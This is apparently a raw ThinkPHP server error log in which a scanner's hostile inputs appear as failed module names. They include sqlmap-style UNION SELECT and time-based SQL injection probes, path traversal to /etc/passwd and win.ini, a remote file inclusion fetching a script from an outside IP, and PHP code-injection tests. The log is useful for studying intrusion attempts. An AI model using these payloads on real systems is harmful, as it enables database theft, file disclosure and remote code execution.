[ 2015-09-30T22:54:09+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-30T22:54:09+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-30T22:54:10+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-30T22:54:11+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:11+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:12+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:12+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:13+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:14+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-30T22:54:14+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-30T22:54:15+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-30T22:54:15+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-30T22:54:16+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:17+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:17+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:18+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:19+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:19+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:20+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T22:54:20+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-30T22:54:21+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-30T22:54:22+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-30T22:54:22+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-30T22:54:23+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:23+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:24+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:25+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:25+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:26+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:26+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:27+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T22:54:28+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T22:54:28+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-30T22:54:29+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-30T22:54:30+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-30T22:54:30+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-30T22:54:31+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:32+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:32+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:33+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:34+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:34+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:35+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:35+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:36+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T22:54:37+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T22:54:37+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T22:54:38+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-30T22:54:38+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-30T22:54:39+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-30T22:54:40+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-30T22:54:40+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:40+08:00 ] ERR: (ThinkException) 无法加载模块/etc/passwd
[ 2015-09-30T22:54:41+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:41+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:42+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:43+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:43+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:44+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:44+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:45+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:46+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T22:54:46+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T22:54:47+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T22:54:47+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../etc/passwd
[ 2015-09-30T22:54:47+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T22:54:48+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-30T22:54:49+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-30T22:54:49+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-30T22:54:50+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-30T22:54:50+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:51+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:51+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:52+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:53+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:53+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:54+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:54+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../etc/passwd .jpg
[ 2015-09-30T22:54:54+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:55+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:55+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:54:56+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T22:54:57+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T22:54:57+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T22:54:58+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T22:54:58+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-30T22:54:59+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-30T22:54:59+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-30T22:55:00+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-30T22:55:01+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-30T22:55:01+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:55:02+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:55:02+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:55:03+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:55:03+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:55:04+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:55:04+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../../../etc/passwd%00
[ 2015-09-30T22:55:05+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:55:05+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:55:06+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:55:06+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:55:07+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-30T22:55:07+08:00 ] ERR: (ThinkException) 无法加载模块Deal AND SLEEP(5)
[ 2015-09-30T22:55:08+08:00 ] ERR: (ThinkException) 无法加载模块Deal AND SLEEP(5) #
[ 2015-09-30T22:55:09+08:00 ] ERR: (ThinkException) 无法加载模块Deal; SELECT PG_SLEEP(5)--
[ 2015-09-30T22:55:09+08:00 ] ERR: (ThinkException) 无法加载模块Deal; SELECT SLEEP(5)-- 
[ 2015-09-30T22:55:10+08:00 ] ERR: (ThinkException) 无法加载模块Deal'; SELECT SLEEP(5)-- 
[ 2015-09-30T22:55:10+08:00 ] ERR: (ThinkException) 无法加载模块Deal) AND SLEEP(5) #
[ 2015-09-30T22:55:11+08:00 ] ERR: (ThinkException) 无法加载模块Deal'; SELECT SLEEP(5)--
[ 2015-09-30T22:55:11+08:00 ] ERR: (ThinkException) 无法加载模块Deal WAITFOR DELAY '0:0:5'--
[ 2015-09-30T22:55:56+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../windows/win.ini
[ 2015-09-30T22:57:55+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../windows/win.ini .jpg
[ 2015-09-30T22:58:52+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
[ 2015-09-30T22:59:04+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
[ 2015-09-30T22:59:16+08:00 ] ERR: (ThinkException) 无法加载模块a_long_name_file_not_exist
[ 2015-09-30T23:00:25+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}
[ 2015-09-30T23:00:40+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}\
[ 2015-09-30T23:00:54+08:00 ] ERR: (ThinkException) 无法加载模块print(md5(this_is_a_test_string));die();/*
